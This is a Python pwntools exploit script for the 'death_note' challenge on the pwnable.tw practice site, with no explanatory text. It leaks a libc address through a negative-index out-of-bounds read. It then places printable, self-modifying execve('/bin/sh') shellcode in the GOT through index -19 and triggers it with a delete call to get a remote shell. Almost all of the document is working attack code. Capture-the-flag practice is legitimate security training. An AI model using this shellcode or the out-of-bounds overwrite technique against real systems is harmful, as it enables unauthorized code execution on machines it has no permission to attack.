#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = "./death_note"
ip = "chall.pwnable.tw"
port = 10201

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc_32.so.6"
if LOCAL:
    io = process(filename)
    # io = gdb.debug(filename, "set  follow-fork-mode child\nb free\nc", )
    # io = gdb.debug(filename, "set  follow-fork-mode child\nset exec-wrapper env 'LD_PRELOAD=./libc_2.27.so'\nb *0x555555554ECA\n", )
    # libc = ELF("/home/pu1p/glibcs/glibc-2.27_out/lib/libc-2.27.so")
    libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process(filename, env={'LD_PRELOAD': remote_libc}) 
    # libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)
    # libc = elf.libc

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "Your choice :", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))


def add(io, idx, con):
    choice(io, 1)
    sla(io, "Index :", str(idx))
    sa(io, "Name :", con)

def show(io, idx):
    choice(io, 2)
    sla(io, "Index :", str(idx))

def remove(io, idx):
    choice(io, 3)
    sla(io, "Index :", str(idx))    

bps.append("*0x8048873")  
# gds['data']=0x4000+0x555555554000


show(io, -8)

ru(io, "Name : ")
flag = u32(rv(io, 4))
log.info("flag: 0x%x", flag)
stdin = u32(rv(io, 4)) - 71
log.info("stdin: 0x%x", stdin)
libc.address = stdin - libc.sym['_IO_2_1_stdin_']
log.info("libc.address: 0x%x", libc.address)
log.info("system: 0x%x", libc.sym['system'])

# input()
# show(io, -22)


shellcode = '''
    /* execve(path='/bin///sh', argv=0, envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
   /*rewrite shellcode to get 'int 80'*/
    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl
    /*set zero to edx*/
    push ecx
    pop edx
   /*set 0x0b to eax*/
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
  /*foo order,for holding the  place*/
    push edx
    pop edx
    push edx
    pop edx
'''
shellcode = asm(shellcode) + b'\x6b\x40' + b'\n'

shellcode = b"j3Z(PI"
shellcode += b"j@Z(PJ(PJ"
shellcode += b"j0X40PZHPRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A"
shellcode += b'\n'

# print(len(sc))
add(io, -19, shellcode)

# mydebug(io)

remove(io, -19)

# add(io, -7, fake_file_1)

io.interactive()